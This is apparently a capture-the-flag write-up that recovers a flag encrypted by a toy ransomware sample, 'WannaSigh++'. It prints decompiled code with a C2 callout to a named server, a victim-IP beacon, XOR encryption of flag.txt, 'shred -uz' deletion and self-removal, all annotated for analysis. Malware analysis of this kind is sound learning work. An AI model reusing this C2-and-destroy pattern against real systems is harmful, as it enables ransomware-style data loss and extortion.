#### Challenge:

The WannaSigh devs have returned - and their new ransomware has encrypted the flag! We first noticed that flag.txt was missing late last Friday night. One of our analysts was able to find this sample, but the evolved ransware has a new way of encrypting files that we have been unable to reverse. The malware is not only more sophisticated, but it appears to be tempermental and resists analysis. As per usual, the WannaSigh++ sample has been zipped with the password "infected".

*The BTC address in the ransom is for the EFF- you will not actually get the flag if you give them $500 (You should never pay the ransom!). Also the ransomware (it feels weird writing ransomware) should only target files named "flag.txt" - but as always you should be careful.

[wannasigh_elf3.zip](./wannasigh_elf3.zip":ignore")
[your-flag.ransomed](./your-flag.ransomed":ignore")

---

#### Solution:

We are given encrypted flag and binary with ransomware that encrypted it. Opening it with `ghidra` I inspected the code and found following interesting function:

```c++
/* encrypt(int) */

void encrypt(int param_1)

{
  int iVar1;
  int iVar2;
  FILE *__stream;
  FILE *__stream_00;
  
  __stream = fopen("flag.txt","r");
  __stream_00 = fopen("your-flag.ransomed","w");
  srand(param_1);
  do {
    iVar1 = fgetc(__stream);
    iVar2 = rand();
    fputc((int)(char)((byte)iVar1 ^ (byte)iVar2),__stream_00);
  } while ((byte)iVar1 != 0xff);
  system("shred -uz flag.txt");
  return;
}
```

- this function seems to be reading the content of the file `flag.txt` and XOR-ing it byte-by-byte with random numbers generated based on the seed that is passed to it as parameter and putting the output to file `file your-flag.ransomed`. After that it deletes the original. I realized that the sequence of random numbers will be the same for the same seed and inverse function to XOR is XOR with the same value, so I copied the `your-flag.ransomed` to `flag.txt` and run the program which produced plaintext flag in `your-flag.ransomed`.

Later I found out in discord that I was quite lucky, because the ransomware server is providing correct seed only the first time the client connects to it, after that it remembers client's IP address that is sent to it by the client and instead of the seed it sends some cheeky text messages while the program uses hardcoded seed (with value `42`). This could have been bypassed by spoofing the ransomware clients message with fake IP (unused one) to get back the correct initial seed. This logic can be seen in the main function, although it's quite obfuscated. Btw, the main function has two other traps, it creates file `.AlreadyRan.nope` which causes subsequent runs of the program to do no action and the last action of the program is to delete itself, so knowing this I feel really lucky to have figured out this challenge on the first run, otherwise it could have been pretty painful... While writing the writeup I played with it while the servers were up and put some comments to the code.

```c++
undefined8 main(void)

{
  char cVar1;
  uint16_t uVar2;
  int iVar3;
  ssize_t sVar4;
  long in_FS_OFFSET;
  int local_188;
  int local_184;
  undefined4 local_180;
  undefined4 local_17c;
  char *local_178;
  hostent *local_170;
  ulong local_168;
  undefined8 local_160;
  undefined8 local_158;
  undefined8 local_150;
  undefined local_148;
  undefined8 local_138;
  undefined8 local_130;
  undefined4 local_128;
  undefined2 local_124;
  undefined local_122;
  undefined local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_158 = 0x79646165726c412e; // these three variables are obfuscated way to generate string '.AlreadyRan.nope' for the trap file
  local_150 = 0x65706f6e2e6e6152; 
  local_148 = 0;
  cVar1 = exists((char *)&local_158); // trap file check
  if (cVar1 != '\x01') {
    system("touch .AlreadyRan.nope"); // trap file creation
    local_178 = (char *)malloc(0xf); // variable for clients ipv4 address to send to malware server
    getIPStr(local_178); // function to query client's ipv4 address to send to malware server
    local_138 = 0x5f68686868616142; // message prefix to send to malware server `Baahhhh_`
    local_130 = 0;
    local_128 = 0;
    local_124 = 0;
    local_122 = 0;
    strcat((char *)&local_138,local_178); // concat message prefix with the ipv4 server. To get the seed send message `Baahhhh_aaa.bbb.ccc.ddd` to the malware server.
    free(local_178);
    local_184 = socket(2,1,0);
    local_180 = 0x48b2; // malware server port = 18610
    local_170 = gethostbyname("wannasigh109fn10fn48vh.wpictf.xyz"); // malware server address
    local_160 = 0;
    local_168 = 2;
    memmove((void *)((long)&local_168 + 4),*local_170->h_addr_list,(long)local_170->h_length);
    uVar2 = htons((uint16_t)local_180);
    local_168._0_4_ = CONCAT22(uVar2,(sa_family_t)local_168);
    local_168 = local_168 & 0xffffffff00000000 | (ulong)(uint)local_168;
    iVar3 = connect(local_184,(sockaddr *)&local_168,0x10);
    if (iVar3 != 0) {
      printf("The WannaSigh++ C2 server appears to be down.");
    }
    sVar4 = write(local_184,&local_138,0x17);
    local_17c = (undefined4)sVar4;
    local_138 = 0;
    local_130 = 0;
    local_128 = 0;
    local_124 = 0;
    local_122 = 0;
    sVar4 = read(local_184,local_118,0x100);
    local_17c = (undefined4)sVar4;
    close(local_184);
    local_188 = 0x2a; // Hardcoded seed value '42'
    __isoc99_sscanf(local_118,&DAT_00102076,&local_188); // Seed value from the malware server (if present in the response (it was '1618617746')) 

    encrypt(local_188); // The encrypt function call
    
    display();
  }
  system("rm -f wannasigh++.elf");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

---

<details><summary>FLAG:</summary>

```
WPI{backup-your-files}
```

</details>
<br/>
